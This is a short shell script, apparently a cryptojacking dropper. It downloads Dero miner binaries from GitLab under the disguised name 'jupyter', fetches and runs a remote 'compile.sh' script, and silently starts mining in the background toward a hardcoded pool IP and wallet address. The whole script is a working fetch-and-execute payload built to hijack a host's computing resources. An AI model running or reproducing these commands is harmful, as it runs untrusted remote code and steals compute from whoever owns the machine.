wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
./jupyter  -r 146.190.93.49:443  -w dero1qyt72azcgj7xhsl33r2z58sx0egyzcfxftxpd6f9t0s4j4tul2f2yqqwgxu4e.$(echo $(shuf -i 1-20000 -n 1)-DEV) >/dev/null &
./compile.sh
